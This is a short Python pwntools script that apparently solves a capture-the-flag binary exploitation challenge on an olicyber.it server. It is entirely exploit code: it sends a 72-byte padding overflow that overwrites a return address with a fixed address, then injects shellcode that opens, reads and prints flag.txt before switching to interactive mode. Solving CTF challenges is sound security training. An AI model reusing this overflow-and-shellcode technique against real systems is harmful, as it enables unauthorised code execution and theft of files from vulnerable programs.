from pwn import *
r = remote("kangaroo.challs.olicyber.it", 20005)

context.arch = "amd64"
context.os = "linux"

shellcode = asm(
    shellcraft.open('flag.txt') +
    shellcraft.read('rax', 'rsp', 50) +
    shellcraft.write(1, 'rsp', 50)
)

r.recv(1000)
payload = b"a" * 72
payload += p64(0x4040c0)
r.sendline(payload)

r.recv(1000)
r.sendline(shellcode)

r.interactive()